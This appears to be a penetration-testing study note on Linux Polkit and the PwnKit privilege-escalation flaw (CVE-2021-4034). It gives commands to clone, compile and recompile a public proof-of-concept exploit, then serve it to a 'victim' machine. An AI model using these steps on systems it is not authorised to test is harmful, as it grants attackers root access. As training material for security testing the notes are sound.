---
title: Polkit
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - privilege
  - escalation
  - linux
---
# Polkit

PolicyKit (`polkit`) is an authorization service on Linux-based operating systems that allows user software and system components to communicate with each other if the user software is authorized to do so. To check whether the user software is authorized for this instruction, `polkit` is asked.

Polkit works with two groups of files.

1. actions/policies (`/usr/share/polkit-1/actions`)
2. rules (`/usr/share/polkit-1/rules.d`)

Polkit also has `local authority` rules which can be used to set or remove additional permissions for users and groups. Custom rules can be placed in the directory `/etc/polkit-1/localauthority/50-local.d` with the file extension `.pkla`.

PolKit also comes with three additional programs:

- `pkexec` - runs a program with the rights of another user or with root rights
- `pkaction` - can be used to display actions
- `pkcheck` - this can be used to check if a process is authorized for a specific action

The most interesting tool for us, in this case, is `pkexec` because it performs the same task as `sudo` and can run a program with the rights of another user or root.

```shell-session
pkexec -u <user> <command>
# Example:
# pkexec -u root id
```


##  CVE-2021-4034:  Pwnkit 

[https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034)

To exploit this vulnerability, we need to download a PoC ([https://github.com/arthepsy/CVE-2021-4034](https://github.com/arthepsy/CVE-2021-4034)) and compile it on the target system itself or a copy we have made.

```shell-session
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc
```

Move the poc file to the target machine and execute it to escalate privileges.

Sometimes you may run into the following error:

```
./poc: /lib/x86_64-linux-gnu/libc.so.6: version GLIBC_2.34' not found (required by ./poc)
```

That means your compiled **`CVE-2021-4034` (Polkit pkexec)** PoC binary was built on a system with **GLIBC 2.34**, but your target system has **an older GLIBC version** (probably 2.31 or lower, common on Ubuntu 20.04). 

You can run from your kali a docker image to compile again the poc. 

```
docker run -it --rm ubuntu:20.04 bash
apt update && apt install gcc make -y

git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc
```

After that, from your kali, copy the generated poc:

```
docker ps
docker cp <container_id>:/poc ./poc
```

Then transfer it to your victim:

```
python3 -m http.server 8000
```